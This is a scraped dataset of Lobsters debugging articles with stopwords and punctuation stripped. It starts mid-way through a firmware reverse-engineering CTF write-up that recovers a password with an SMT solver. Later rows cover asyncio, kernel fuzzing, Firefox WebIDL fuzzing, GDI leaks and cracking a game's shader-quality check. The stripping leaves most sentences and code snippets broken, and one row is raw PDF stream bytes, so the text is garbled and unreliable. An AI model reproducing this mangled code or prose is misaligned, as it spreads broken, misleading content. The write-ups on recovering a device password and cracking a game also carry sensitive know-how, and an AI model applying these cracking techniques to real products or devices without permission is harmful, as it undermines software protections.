crystal oscillator case usart set constant mhzlab assignmentthere two file going need exercise file found virustotalone bin file dumped firmware image second hex firmware file used upload processed arduino nano board next step getting board ready upload hex file downloaded using avrdude connect board computer via usb sure installed avrtools typical baud rate upload speed going going run command line get firmware board jumpy git master avrdude c arduino p p u v u flash w jumpyhexat point need figure baud rate usart using communicate serial data running baudratepy get result use application screen communicate board machinescreen outputlooks like pretty straightforward singlepassword check let move jumpybin file start reverse engineering process going use ghidra project found lot cleaner using avr disassembler load file project directory specifying language must case little endian assembly best optionghidra automatically analyze code including vector table start disassembly output one thing note see lot opcodes analyzed code section case highlight byte press automatically disassemble opcodes use f key afterwards create newly examined code functionafter ghidra completed analyzing binary file output look bit convoluted first set subroutine responsible initializing peripheral usarttxrx spi timer pcint interrupt reset tableside note ever want find main function firmware code trace base address reset bootloader always contain simple jump ie jmp address outside bootloader directly lead start routine hold main performing lot operation setup environmentjump start mainwe likely better luck dynamic analysis easy definitely give lot satisfying result string table show much xref offset code segmentemulatorthe goal right emulate code figure firmware asking input user usart find offset beginning set breakpoint commence steptracing first offset noticed show logical code function c cf push ylo df push yhi cd ylo spl de yhi sph sbiw start debugger three tool going need download open three terminal window let start first one run simavrsimduino command booloader bytesavrspecialinitavrgdbinit listening port bridge port uartptyconnect point export install picocom get terminalnext picocom used bridge usart communication next terminal window run command picocom nonebaudrate nonedatabits calocal echo nonoinit nonoreset nonolock nosendcmd sz vvreceivecmd rz vv eimap omap emap crcrlf delbs type ca ch see available commandsterminal readythis setup get u ready connect gdb server run avrgdb third terminal avrgdb jumpybin gdb target remote debugging using gdb break pc breakpoint gdb ccontinuingbreakpoint hit looking picocom look like hit sort text output yet yet reached point code sending data usart terminal using gdb command stepi good trial error technique see much step beginning first letter output pico terminal interestingly hit breakpoint switch back picocom see letter printed screen function look like responsible sending data tx tracing back ghidra look like hitting peripheral component undefined undefined return stack buf xref entry point push cd ylo splafter stepping time come point find directly printing picocom terminal gdb pc st z pop pop pop ret push push ldi gdb r u make sense printing string input whats happening code register hold next byte store z using st instruction looking atmel instruction manual see exactly operation indirectly store register data space using index x z look ghidra decompiles logic look like byte undefined array index hold string table st instruction seen volatile write datadebug register make note gdb offset ghidra part usartrx offset ghidra responsible usarttx side note register pair used operation used register pair x z clarifying confusion around debugging information memory wanted dump content using gdb command would crafted like txrx interrupt located need able find input actually processed stepping bunch code look like may found ghidra input get processed cpi brbs ldd cpi responsible comparing immediate value sparked interest looking value r n ascii theory set breakpoint start function offset ghidra picocom terminal prompt u input allow u enter string hitting enter hit breakpoint gdb window gdb break pc breakpoint gdb ccontinuingnote automatically using hardware breakpoints readonly addressesbreakpoint gdb pico terminal terminal readyinput look like breakpoint hit without giving u opportunity input string let continue browsing stack processinput push cd ylo spl de yhi sph std std rjmp call set breakpoint look like function call offset decompiling function get output uint void byte uartreadchar char w w uint z return w subroutine look simple enough set w register interpret bit usart status control register successful take byte time read usart data register null terminating character found w hold entire value knowing set breakpoint function call offset ghidra let try set breakpoint new offset see work time gdb window gdb break pc breakpoint gdb ccontinuingnote automatically using hardware breakpoints readonly address pico terminal terminal readyinput helloworld breakpoint hit gdb window hitting enter breakpoint gdb perfect saw hold byte compare n r confirm see register hold first byte h gdb r offset hitting breakpoint x amount time x equal size string code process null terminating string function exit input string held address gdb helloworld time step function see routine crossreferenced reach return instruction pc redirected module undefined undefined return stack buffer cf push ylo df push yhi push cd ylo spl de yhi sph std could winning ticket happens next string keep track offset ghidra started step function one instruction time look like actually comparing anything interest function returned something interesting started show got bit code base add wlo adc whi cpi cpc whi brbc zflglooks like two register added compared value let set breakpoint gdb offset see value input possibly added together gdb window gdb break pc breakpoint gdb ccontinuingnote automatically using hardware breakpoints readonly address pico terminal terminal readyinput breakpoint hit gdb window hitting enter breakpoint gdb pc add adc cpi gdb r gdb r see index r index l added give u hexadecimal value know routine begin ghidra rename function move code base start see lot similar code side note start labeling comparative function keep track index input string compared comparing index add wlo adc whi cpi comparing index add wlo adc whi cpi comparing index mul add whi eor cpi sbci brbc zflgover address operation look bit different comparison index input string get ordinal multiplied get compared lower word byte value result higher byte value word example take two index r multiply two integer obtain value lower byte word loword equation higher byte hiword value comparison look like pseudocode ord ord r ord ord r sbci instruction subtracts carry immediate command final value index need equal static analysis really take care rest know specific mnemonic keep eye build constraint table use theorem solve rest size string character seen snippet decompiled code w char inputstring char w inside ghidra function tab labeled subroutine responsible comparing byte theorem solutionto put simply prover created satisfiability modulo theory smt problem decision problem logical formula combination include arithmetic bitvectors array unresolved function effective smt solver specialized algorithm solve background theory mentioned download python library hereat point formulate conditionals firmware code check right password constraint enter bitvector used shorthand subtermsif string string string string string string string string string string string string string string string string string string string string string decryptflag side note flag string get loaded ghidra offset use instruction lpm load data byte flash program memory register file zregister register file used access program memory place data register final check function called offset confirm many time variable iscompared set true equal code proceed print lpm z sflag rnflag cpi lsl brbc zflg ldi ldi aa call usartprint landed get wrong password msg ldi ldi aa call usartprintafter value added constraint use check function examine whether assertion given solver plus optional assumption consistent assertion return true next step would return model last check function raise exception model available eg last check returned unsat assignment satisfy quantified axiom simple test see library work would use three unknown linear equation challenge like xy z import x z int x int int z test solution simplesolver sadd x scheck unknown sadd x scheck unsat reset general purpose solver limited amount preprocessing simplesolver sadd x sadd z scheck sat smodel z x apply logic unknown mentioned see unable satisfy requirement needed model solution return unknown everything added considered unsatisfiableafter running solver finally get password needed decrypt flag ryancor ryancorvirtualbox python solvepy found password next step would program module take password automatically sends atmega usart serial port retrieves flag source code script found order make sure board plugged usb port connected linux vm usb port ensure vm recognizes device check kernel message log right plugged see usbcore registered new interface driver called ryancor ryancorvirtualbox dmesg vboxguestioctlhgcmcall failed usb new fullspeed usb device number using usb new usb device found usb new usb device string usb product usbcore registered new interface driver usbserial usb serial support registered generic usbcore registered new interface driver usbserial usb serial support registered converter detected usb converter attached case port going connect python script located running script get successful decrypted flag microcontrollerryancor ryancorvirtualbox python solvepy found password sending input driver flag thank following along hope enjoyed much question article find challenge please dm instagram hackersclub twitter ringowarehappy hunting p missed link solver program find source code
67,Lobsters,debugging,Debugging,Latency in Asynchronous Python,https://nullprogram.com/blog/2020/05/24/,latency asynchronous python,python asyncio singlethreaded program dumb bytecode compiler semaphore answer solving job queue job queue go unbounded queue never ever use unbounded queue every unbounded bug important takeaway argument trio documentation unbounded queue,may week debugging misbehaving python program make significant use python asyncio program would eventually take long period time respond network request first suspicion cpuheavy coroutine hogging thread preventing socket coroutines running inspection pdb showed case instead program author made couple fundamental mistake using asyncio let discus using small example setting stage heartbeat coroutine beat per second real program would send packet heartbeat print late scheduled async def heartbeat true start timetime await asynciosleep delay timetime start print fheartbeat delay delay running asynciorun heartbeat heartbeat delay heartbeat delay heartbeat delay consistently late good enough especially considering come program sends heartbeat pretty useless real program busy working thing concurrently example little payload work represented process function jobduration async def process timesleep jobduration simulate cpu time synchronous sleep standing actual cpu work maybe parsing json loop crunching number numpy use imagination coroutines scheduled still singlethreaded program jobcount async def main asynciocreatetask heartbeat await asynciosleep print begin processing count jobcount range jobcount asynciocreatetask process await asynciosleep program start heartbeat coroutine task coroutine make progress unless someone waiting something task continue along independently without prodding arbitrary second sleep simulates waiting say network request output see heartbeat tick couple time create process job concurrently real program way collect result ignore part effect heartbeat pretty small right heartbeat delay heartbeat delay begin processing heartbeat delay heartbeat delay heartbeat delay heartbeat delayed second mere task work happened python call object schedule task loop coincidence everything scheduled get put loop scheduled round robin one another task got scheduled ahead heartbeat get scheduled task either yield await completes really take much significantly hamper heartbeat dumb bytecode compiler may much work lesson avoid spawning many task latency important consideration semaphore answer first idea solution used semaphore limit number active task time perhaps heartbeat compete many task time workercount max active job time async def mainwithsemaphore asynciocreatetask heartbeat await asynciosleep sem asynciosemaphore workercount async def process await semacquire timesleep jobduration semrelease print begin processing range jobcount asynciocreatetask process await asynciosleep heartbeat sleep completes half job complete half blocked semaphore perhaps heartbeat get skip ahead blocked task since yet ready run heartbeat delay heartbeat delay begin processing heartbeat delay heartbeat delay heartbeat delay made difference whatsoever task held place line loop even reducing workercount would effect soon task completes free task waiting next line semaphore practically nothing solving job queue work job queue create queue populated coroutines task small number task run job queue since real solution made example complete async def mainwithqueue asynciocreatetask heartbeat await asynciosleep queue asyncioqueue async def worker true coro await queueget await coro consider using tryexcept queuetaskdone worker asynciocreatetask worker range workercount print begin processing range jobcount await queueput process await queuejoin print end processing w worker wcancel await asynciosleep taskdone join method make trivial synchronize full job completion also take time destroy worker task harmless leave blocked queue garbage collected resource leak however cpython complains garbage collecting running task look like mistake usually read carefully might noticed queue maximum size set much queue go developer recognize nearly unbuffered channel default common kind channel synchronized rendezvous producer put consumer get producer wait queue job task free come take task wait queue producer arrives job heartbeat delay heartbeat delay begin processing heartbeat delay heartbeat delay end processing heartbeat delay heartbeat delay output show impact heartbeat modest best could hope asyncawait heartbeat continued job running concurrency worker task running queue greater latency note increasing workercount toy example impact latency since job actually concurrent start run complete another worker task draw queue putting couple awaits process allows concurrency workercount async def process await asynciosleep timesleep jobduration await asynciosleep since many worker task back initial problem heartbeat delay heartbeat delay begin processing heartbeat delay end processing heartbeat delay heartbeat delay workercount decrease heartbeat latency unbounded queue another defect program create unbounded queue producer consumer consumer print queue size see happening async def producerconsumer queue asyncioqueue done asynciocondition async def producer range await queueput await queuejoin async done donenotify async def consumer true await queueget print fqsize queueqsize queuetaskdone asynciocreatetask producer asynciocreatetask consumer async done await donewait output program begin qsize qsize qsize qsize entire queue populated consumer anything ton latency whatever consumed since queue unbounded producer never need yield might tempted use asynciosleep producer yield explicitly async def producer range await queueput await asynciosleep yield await queuejoin async done donenotify even seems work output look like qsize qsize qsize qsize however fragile real solution consumer yield two time loop nearly back started async def consumer true await queueget print fqsize queueqsize queuetaskdone await asynciosleep await asynciosleep output show producer gradually creep ahead consumer consumer iteration producer iterates twice qsize qsize qsize qsize really simple solution never ever use unbounded queue fact every unbounded asyncioqueue bug serious api defect asyncio allows unbounded queue created default maxsize actually zero unbuffered infinite unbounded default virtually every example asyncioqueue online offline even official documentation broken way important takeaway default asyncioqueue always wrong asynciosleep nearly always used incorrectly use job queue instead spawning many identical task python linters updated warn default update couple people pointed argument trio documentation unbounded queue argument conflates two different concept data structure queue concurrent communication infrastructure queue distinguish latter often called channel unbounded queue collectionsdeque necessary unbounded channel asyncioqueue always wrong trio documentation describes web crawler fundamentally breadthfirst search read queueoriented graph plain old bfs queue channel reasonable unbounded
68,Lobsters,debugging,Debugging,Detecting Optimization Bugs in Database Engines via Non-Optimizing Reference Engine Construction,https://www.manuelrigger.at/preprints/NoREC.pdf,detecting optimization bug database engine via nonoptimizing reference engine construction,,obj length filter flatedecode stream p jbd c e endstream endobj obj length filter flatedecode stream n c u q vlf
69,Lobsters,debugging,Debugging,Infer: Find Races and Deadlocks,https://medium.com/@thomas.dubuisson/infer-find-races-and-deadlocks-e9e33c4091f7,infer find race deadlock,infer find race deadlock pdf infer facebook say business using infer toy install infer thing,infer find race deadlocksin almost evolutionary manner programmer learned mostly avoid lock shared mutable memory push come shove reach primitive unfortunately found need lock writing pope tree extension postgres building prototype wound lock hell lucky powerful tool help situation story using infer get notfiredthe pope tree pdf description tad academic need understand read tree populated lazily node tree buffer data insertion query cause child node created element buffer binned node next layer want allow highthroughput querying parallel read congratulation read cause tree mutate prototype used badlyfortunately cryptographic structure half day job half busy developing way make facebook infer static analyzer accessible let look infer applying played outinfer notfacebook say infer static analysis tool give infer java ccobjectivec code produce list potential bugswhat great sentence infer find bug maybe bug actually give code tell build code infer linter look code local context considers function interact across compilation unit file package analysis infer assigns sort type signature function signature describes inputoutput impact function heap acquired resource allocation lock writes similar squint caller provide suitablyshaped heap callee requires well bugon business using infer toysenough banter install infer start thing first let download infer docker containerdocker run rm tommdinfer bashsecond let make toy c file tell infer build itcat eof toyc include stdlibh int main int ptr malloc sizeof int ptr return ptr eofclearly correct let infer turn build system necessary build instruction indicating gccinfer run gcc toyccapturing makecc mode found source file analyze inferout
70,Lobsters,debugging,Debugging,Using syzkaller: fuzzing your changes,https://www.collabora.com/news-and-blog/blog/2020/05/12/using-syzkaller-fuzzing-your-changes/,using syzkaller fuzzing change,part part modifying ptrace conclusion important note merged pull request syscall description documentation contribuiting guide continue reading using syzkaller part driver fuzzing,part part blog series syzkaller introduced tool looked install use improve code base let look properly add new description check happens bug situation bug introduced see tool action chose modify ptrace syscall hope break entire system properly working syscall definition per man page long ptrace enum ptracerequest request pidt pid void addr void data ptrace definition syzkaller ptrace req flag ptracereq pid pid ptrace peek req flag ptracereqpeek pid pid addr ptr intptr ptrace poke req flag ptracereqpoke pid pid addr ptr intptr data intptr ptrace peekuser req const ptracepeekusr pid pid addr intptr want look ptrace fuzzed modify add enablesyscalls configcfg enablesyscalls ptrace try run work since ptrace requires pid argument syscall return pid enabled tool warn user suggest syscalls enabled disabling ptrace syscalls create resource pid enable syscalls create bpf bpftaskfdquery fcntl getown fcntl getownex getpid choose enablesyscalls ptrace getpid try run start working take time get real cover increase code executed message appear syzkaller log binsyzmanager configconfigcfg executed cover executed cover executed cover executed cover executed cover executed cover executed cover executed cover executed cover executed cover cover number metric derivated line code function called many time loop iterated modifying ptrace let break ptrace following modification syscall definition kernelptracec file changed insertion diff git akernelptracec bkernelptracec index akernelptracec bkernelptracec ptrace long request long pid unsigned long addr struct taskstruct child long ret pid bug request ptracetraceme ret ptracetraceme ret way every time ptrace called pid argument trigger kernel crash instead waiting tool reach bug let give hand describe reach bug added following new definition syslinuxsystxt ptrace broken req pid const new description call ptrace syscall random value first argument required reach bug demonstration always use second one since modified definition need recompile tool done two step extraction information rebuild fuzzer generator command extract information syscall description txt file kernel source current architecture since cross compiling working used arch value get information like syscall number based syscall name defined syzkaller definition kernel source compare description tool provides check compatible make binsyzextract binsyzextract oslinux sourcedir ksrc systxt note take effect linux specifically architecture syscalls described systxt make work txt file remove last argument step may trigger warning saying syscalls supported architecture depending current state linuxnext kernel branch v branch used syzkaller maintainer warning usually fatal compiled kernel support syscalls updating extracting syscalls definition tool need rebuilt generate updated fuzzer input make generate make running changed enabledsyscalls configuration file run broken syscall enablesyscalls ptrace broken run receive notification syzkaller log displayed terminal introduced bug detected crash kernel bug kernelptracec line digging little deeper see following call made resulting kernel bug trace ptrace broken cut kernel bug invalid opcode smp kasan pti cpu pid comm tainted conclusion important note go fuzzer captured crash internal tool try generate c source code reproduces bug order make debugging easier however perfect may generate reproducer bug may look crash log figure write reproducer even manages create one scrutinise actually probably required might unable properly isolate part trigger bug nt mean reduce credit given tool created reproducer done work making life easier explained step syzextract tool used description architecture extracted want extract architecture required contribute project use make extract however require lot cross compiler installed arm power mips due parallel cross compiling command run make mrproper kernel source suggest backing config file bzimage using ccache avoid loosing much time recompilations finally learn work around futex modification syzkaller see merged pull request lastly opening pull request make sure read syscall description documentation contribuiting guide continue reading using syzkaller part driver fuzzing
71,Lobsters,debugging,Debugging,Fuzzing Firefox with WebIDL,https://hacks.mozilla.org/2020/04/fuzzing-with-webidl/,fuzzing firefox webidl,tl dr introduction firefox fuzzing doc fuzzing book webidl bug fuzzing basic type fuzzers blackbox fuzzing whitebox fuzzing greybox fuzzing smaller deterministic target process large number input quickly grammarbased fuzzing domato dharma htmlcanvaselement issue traditional grammar enums webidl fuzzing grammar webidl interface description language wadi fuzzer sensepost standardized grammar abstract syntax tree simplified grammar development ecmascript extended attribute automatic detection api change transforming idl javascript abstractsyntax tree generic type webidl specification object reference callback handler promise callback event listener zero configuration fuzzing blob specification domstring rule patching gridl realworld example bug useafterfree indexeddb api contributing contributing code development firefox,tl dr introduction fuzzing fuzz testing automated approach testing safety stability software typically performed supplying specially crafted input identify unexpected even dangerous behavior unfamiliar basic fuzzing find lot information firefox fuzzing doc fuzzing book past year firefox fuzzing team developing new fuzzer help identify security vulnerability implementation webapis firefox fuzzer calling domino leverage webapis webidl definition fuzzing grammar approach led identification bug bug received security rating post like discus domino key feature differ previous webapi fuzzing effort fuzzing basic begin discussing domino work first need discus type fuzzing technique available u today type fuzzers fuzzers typically classified either blackbox greybox whitebox designation based upon level communication fuzzer target application two common type blackbox greybox fuzzers blackbox fuzzing blackbox fuzzing submits data target application essentially knowledge data affect target restriction effectiveness blackbox fuzzer based entirely fitness generated data blackbox fuzzing often used large nondeterministic application process highly structured data whitebox fuzzing whitebox fuzzing enables direct correlation fuzzer target application order generate data satisfies application requirement typically involves use theorem solver evaluate branch condition generate data intentionally exercise branch fuzzer test hardtoreach branch might never tested blackbox greybox fuzzers downside type computationally expensive large application complex branching may require significant amount time solve greatly reduces number input tested outside academic exercise whitebox fuzzing often feasible realworld application greybox fuzzing greybox fuzzing emerged one popular effective fuzzing technique fuzzers implement feedback mechanism typically via instrumentation inform decision data generate future input appear cover code reused basis later test input decrease coverage discarded method incredibly popular due speed efficiency reaching obscure code path however target good candidate greybox fuzzing greybox fuzzing typically work best smaller deterministic target process large number input quickly several hundred second often use type fuzzers test individual component within firefox medium parser interested learning leverage fuzzers test code take look fuzzing interface documentation unfortunately somewhat limited technique use fuzzing webapis browser nature nondeterministic input highly structured additionally process starting browser executing test monitoring fault slow several second minute per test limitation blackbox fuzzing appropriate solution however since input expected apis highly structured need ensure fuzzer generates data considered valid grammarbased fuzzing grammarbased fuzzing fuzzing technique us formal language grammar define structure data generated grammar typically represented plaintext use combination symbol constant represent data fuzzer parse grammar use generate fuzzed output example demonstrate two simplified grammar excerpt domato dharma fuzzers grammar describe process creating htmlcanvaselement manipulating property operation issue traditional grammar unfortunately level effort required develop grammar directly proportional size complexity data attempting represent biggest downside grammarbased fuzzing reference webapis firefox expose interface approximately member keep mind number account required data structure like callback enums dictionary name creating grammar describe apis accurately would huge undertaking mention errorprone difficult maintain effectively fuzz apis wanted avoid much manual grammar development possible webidl fuzzing grammar typedef buffersource blob usvstring blobpart exposed window worker interface blob throw constructor optional sequence blobparts optional blobpropertybag option getterthrows readonly attribute unsigned long long size readonly attribute domstring type throw blob slice optional clamp long long start optional clamp long long end optional domstring contenttype newobject throw readablestream stream newobject promise text newobject promise arraybuffer enum endingtype transparent native dictionary blobpropertybag domstring type endingtype ending transparent simplified example blob webidl definition webidl interface description language idl describing apis implemented browser list interface member value exposed apis well syntax webidl definition well known among browser fuzzing community wealth information contained within previous work done area extract data idls use fuzzing grammar namely wadi fuzzer sensepost however example investigated found information definition extracted reimplemented using fuzzer native grammar syntax approach still requires significant amount manual effort fuzzing grammar syntax make difficult impossible instance describe behavior specific webapis based issue decided use webidl definition directly rather converting existing fuzzing grammar syntax approach provides u number benefit standardized grammar first foremost webidl specification defines standardized grammar definition must adhere let u leverage existing tool parsing raw webidl definition converting abstract syntax tree ast ast interpreted fuzzer generate testcases simplified grammar development second webidl defines structure behavior apis intend target thus significantly reduce amount required rule development contrast describe apis using one previously mentioned grammar would create individual rule interface member value defined api ecmascript extended attribute unlike traditional grammar define structure data webidl specification provides additional information regarding interface behavior via ecmascript extended attribute extended attribute describe variety behavior including context particular interface used whether returned object new duplicate instance member instance replaced type behavior typically represented traditional grammar automatic detection api change finally since webidl file linked interface implemented browser ensure update webidl reflect update interface transforming idl javascript order leverage webidl fuzzing first need parse fortunately u use library convert raw idl file abstractsyntax tree ast ast generated describes data series node tree node defines construct webidl syntax information ast structure found ast simply need define translation construct domino implemented series tool traversing ast translating ast node javascript diagram demonstrates translation node represented using static translation mean construct ast always representation javascript example constructor keyword always replaced javascript new operator combination interface name however several instance webidl construct many meaning must generated dynamically generic type webidl specification list number type used representing generic value type domino implement function either return randomly generated value matching requested type previously recorded object type example iterating ast occurrence numeric type octet short long return value within numeric range object reference place construct type reference another idl definition used argument value require object instance idl type one value identified domino attempt create new instance object via constructor attempt identifying accessing another member return object type callback handler webidl specification also defines number type represent function ie promise callback event listener type domino generate unique function performs random operation supplied argument present course step account small fraction necessary fully translate idls javascript domino generator implement support entire webidl specification let take look output might look like using blob webidl fuzzing grammar zero configuration fuzzing const domino require dominodistsrcindexjs const random require dominodistsrcstrategiesindexjs const domino new domino blob strategy random output test dominogeneratetestcase const new arraybuffer new new blob text function text function slice stream slice foobar arraybuffer function text function slice see information provided idl enough generate valid testcases case exercise fairly large portion blobrelated code turn allows u quickly develop baseline fuzzers new apis zero manual intervention unfortunately everything precise would prefer take instance value supplied slice operation reviewing blob specification see start end argument expected byteorder position relative size blob currently generating number random seems unlikely able return value within limit blob length furthermore contenttype argument slice operation type property blobpropertybag dictionary defined domstring similar numeric value generate string random however review specification indicates value used represent medium type blob data appear value much effect blob object directly nevertheless certain value effect apis consume blob address issue needed develop way differentiating generic type rule patching gridl need developed another tool named gridl gridl leverage library converting idl definition ast also make several optimization ast better support use fuzzing grammar however interesting feature gridl dynamically patch idl declaration precise value required using rulebased matching system gridl identifies target value insert unique identifier identifier correspond matching generator implemented domino iterating ast one identifier encountered domino call matching generator emits value returned diagram demonstrates correlation gridl identifier domino generator defined two generator one return byte offset return valid mime type important note generator also receive access live representation current object fuzzed provides u ability generate value informed current state object example leverage object generate byte offset slice function relative length however consider attribute operation associated webglrenderingcontextbase interface interface could implemented either webgl context argument required may vary drastically referencing current object fuzzed determine context type return value accordingly dominogeneratetestcase const new new blob null null type image ending transparent slice size size applicationxhtmlxml arraybuffer function settimeout function text function stream arraybuffer function slice size size textplain stream text function slice size size texthtml slice size size textxml stream newly created rule able generate value closely resemble described specification realworld example example included post greatly simplified often hard see approach like might applied complex apis like leave example one complex vulnerability uncovered domino bug identified critical useafterfree vulnerability affecting indexeddb api vulnerability interesting fuzzing perspective due level complexity required trigger issue domino able trigger vulnerability creating file global context passing file object worker context indexeddb database connection established level coordination context would often difficult describe using traditional grammar however due detailed description apis provided webidl domino identify vulnerability like ease contributing final note domino continues find securitysensitive vulnerability code unfortunately mean release yet public use however plan release generic version near future stay tuned like get started contributing code development firefox plenty open opportunity mozilla employee nda code contributor like work domino feel free reach team fuzzing room riot matrix
72,Lobsters,debugging,Debugging,GDI leaks and the importance of luck,https://randomascii.wordpress.com/2020/05/10/gdi-leaks-and-the-importance-of-luck/,gdi leak importance luck,gdi graphic device interface object magic number first background see source code coworkers added code process environment block gdiview misinterpretation collectgdiusageanddie landed change crashifexcessivehandles dessert topping floor wax back story chrome remote desktop crd app created real fix raii ftw heap snapshot heap profiling leak sanitizer discussion thread start like,may asked look potentially serious chrome bug initially misdiagnosed unimportant thus wasting two valuable week rejoined investigation number one browserprocess crash chrome beta channel oops june day realized misinterpreted crash data bug marked releaseblockstable meaning ship new chrome version user figured going crash happening running gdi graphic device interface object know type gdi object crash data gave u clue problem happening reproduce problem several u worked hard bug june testing theory making clear progress june went check email chrome immediately crashed crash irony rich searching change crash report brainstorming could possibly causing chrome browser process leak gdi object gdi object count browser creeping inexorably upward morning tipped magic number point one gdi object allocation failed intentionally crashed browser improbably lucky break bug reproducible inevitably fixable figure triggered bug would able fix first background place chromium code try allocate gdi object check see allocation succeeded allocation failed record information stack intentionally crash see source code intentionally crash allocate gdi object render screen better report issue crash reporting enabled restart process rather display blank ui default limit gdi object per process usually use hundred hit limit something gone terribly wrong get one crash report showing gdi object allocation failure call stack sort useful information great problem crash dump necessarily related bug code leaking gdi object code report failure may code roughly speaking two type code void goodcode auto x allocategdiobject x collectgdiusageanddie usegdiobject x freegdiobject x void badcode auto x allocategdiobject usegdiobject x good code notice allocation failed report whereas bad code ignores failure leak object thus setting good code take fall chromium million line code know function buggy even know type gdi object leaked one coworkers added code troll process environment block crashing get count gdi object type enumerated type dc region bitmap palette font brush pen unknown count totaled le one hundred weird turn object directly allocate table object created behalf kernel live somewhere window object manager mean gdiview blind problem gdiview helpful anyway local repro leaking cursor cursor object associated gdi object gdi object allocated kernel blind happening misinterpretation collectgdiusageanddie function catchy name think agree evocative problem much collectgdiusageanddie checked dozen different type gdi object allocation failure due inlining ended getting crash signature crashed main function got bucketed together one coworkers wisely landed change break different check different noninlined function meant could tell glance check failing unfortunately meant started getting crash report crashifexcessivehandles confidently said crash spike signature change mistake crash spike signature change dessert topping floor wax oops sloppy analysis dawson cooky back story point knew something done june used almost gdi object day could figure could crack case window task manager optional gdi object column used look leak june working home connecting machine work column enabled work machine ran test tried come repro scenario meanwhile web browser home machine leaking gdi object main thing using browser home machine connect work machine using chrome remote desktop crd app enabled gdi object column home machine started experimenting take long get result fact bug timeline show took minute go hit crash pm something crd cursor mention much easier bug investigation local repro turned every time crd app chrome app changed cursor would leak six gdi object wiggling mouse right part screen using chrome remote desktop could leak hundred gdi object per minute thousand per hour started paying attention gdi object column task manager quickly became apparent could see gdi object count leap whenever cursor changed month progress problem gone intractable simple fix created hack fix one coworkers apparently actual work bug created real fix uploaded june landed pm merges later bug vanquished fixing bug nice really want way make sure bug never come back using c object manage resource raii ftw clearly right thing case webcursor class bug come memory leak robust set system available microsoft heap snapshot chromium heap profiling wild leak sanitizer test machine gdi object leak detection seems neglected process information block incomplete information gdi object enumerated kernel mode single chokepoint allocating freeing object allow easy tracing first gdi object leak dealt last robust way tracking suggestion windowsnext make trivial get count gdi object type without requiring arcane peb reading without skipping cursor supported way intercept trace gdi object creation destruction robust tracking including created indirectly make sure documented sort tracking even hard since gdi object necessarily constrained way memory would great make quirky unavoidable gdi object safer use please reddit discussion twitter thread start like like loading related
73,Lobsters,debugging,Debugging,Open-source Web debugging proxy alternative to Charles,https://github.com/alibaba/lightproxy,opensource web debugging proxy alternative charles,download document contribute introduction 介绍文章 faq certificate install system proxy setting preview gif download macos version download window version download quick start http lightproxyorgdocgettingstarted contribute env important dev sendapr contributor,download document contribute introduction 介绍文章 faq outofbox fully automation certificate install system proxy setting battery include powerful hostsproxycapture based whistle u need input hackable could write even nodejs proxy rule preview gif download macos version download window version download quick start take quick start http lightproxyorgdocgettingstarted contribute env nodejs important npm install g electronbuilder need bundle application dev git clone http githubcomalibabalightproxy cd lightproxy yarn run installdeps yarn run dev new contributor try fix contributor
74,Lobsters,debugging,Debugging,The root cause of a crash,http://boston.conman.org/2020/05/06.1,root cause crash,found able get stack trace gemini client program gemini gateway memory leak writing solid code thinking forth http bostonconmanorg http arbitrary portion time,found happend yet time able get stack trace woot case bug fix laughably trivial found trouble always finding one hope learn next time normal pattern request came program crash time stack trace hoping capture request gemini geminiconmanorgtesttorture subject issuer request gemini subject issuer request gemini subject issuer request gemini subject issuer request gemini subject issuer request gemini subject issuer request gemini subject issuer request gemini subject issuer request gemini subject issuer request subject issuer gc stack traceback c method close method close function write stack traceback c method write function tail call upvalue reply function series request exist test gemini client program since patched memory leak program always crashed test first clue test see client properly handle relative link title linkfull path parent directory text status contenttype textgemini point writing client manipulates url directly need look section handle relative path correctly thing get really messy want skip ahead mime portion select second link instead first test heck used two different client one wrote gemini gateway never able reproduce error second clue never bother look deeper stack trace able track issue bit code bit see context actual bug last block code lochost log reply io msg rn io close return end locscheme gemini lochost confnetworkhost locport confnetworkport log reply io msg rn io close return end relative path resolution domain client server reject request relative path element locpath match locpath match log reply io msg rn io close end error path one close connection return handler except case relative path head meet desk clue pointing right problem could nt see reason could nt reproduce issue two client used implemented properly course check relative path would nt trigger reason never found memory leak prevented gc method running meant tl context pointer would never overwritten null thus crash fixing bug revealed existed since originally wrote code test hand running openssl sclient connect typing request relative path quickly revealed found root cause crash might occur ask nt write ltlsclose function like static int ltlsclose luastate l struct tl lualcheckudata typetls tl null luapushinteger tlserror return int rc tlsclose struct tl lualcheckudata typetls rc tlswantpollin rc tlswantpollout ltlsgc l luapushinteger l rc return function check null pointer routine tl module check null pointer conscience decision part defensive code hide real bug case definitely would hidden bug came conclusion read writing solid code year ago one two book radically changed approach one thinking forth well worth reading even nt program forth book present solid case defensive code hide bug much better even took week track bug worth end permission link freely entry go ahead wo nt bite promise date permanent link day entry entry one entry title permanent link entry format link simple start base link site http bostonconmanorg add date interested say would make final url http also specify entire month leaving day portion even select arbitrary portion time may also note subtle shading link intentional closer link relative page brighter appears experiment using color shading denote distance link nt notice nt worry important assumed every brand name slogan corporate name symbol design element et cetera mentioned page protected andor trademarked entity sole property owner acknowledgement status implied
76,Lobsters,debugging,Debugging,Cracking Age of Empires III over shader quality settings,https://medium.com/@lancelot.deferriere/cracking-age-of-empires-iii-over-shader-quality-settings-7f729528cf1d,cracking age empire iii shader quality setting,step finding relevant bit log file string literal first assembly line turingcomplete endianness namemangled step backward ucomiss highlevel shading language actually hacking,step finding relevant bitthis perhaps surprisingly tricky part disassembled code idea look true game ship level debug symbol making function name readable one hopper give make thatthankfully head start log file quite likely writing log us string literal basically mean ascii hardcoded executable something grep amount compiling delete code obfuscation might hide though thankfully case grepping string literal usually first thing disassembling somethingso let go ahead type found vendor hopper search see find something yay literal string love thingson really move forward much since adress literal string hardcoded actually find reference hopper green bit right data doubleclicking take procedure hero daythere find assembly code unlike may think assembly code easy read hard part understanding ithopper us intel syntax default mean first operand destination second one source highlighted line see mov dword axmlrenderconfi let unpack thatour first assembly linemov mov instruction famously turingcomplete move well copy data b basically mean read writes bgiven told axmlrenderconfi dword b destination let unpack furtheraxmlrenderconfi actually hopper helping u truth alias memory address string literal clicked second ago split window look thing hexmode preferred hacker mode anyways see right therehopper conveniently highlight selected bit sidesif reverse right way memory address string literal even highlighted yellow one screenshots one mystery solved moving ie writing address spelled well endianness rather arcane topic usually little impact one thing make people go know computer work looked citation failed know mean u number look today problemyou might noticed said wrote address right actually care content happens nullterminated string literal writing address code line refer address pointerwhat dword one trickier dword technically mean operating doublewords aka bit mean copying bit recall memory address hexadecimal character hexadecimal character take value bit data way bit computer system come using bit memory address would written would twice long time bigger would copy byte would give much memory play also twice work copy pointer bit really twice fast bit boy girl way complete explanation word found course complicated thatnow bracketed bit bracket mean compute whatever inside treat like pointer mov thus write whatever memory address evaluates toagain let break worry done basically know read assembly code intel syntax esp register closest 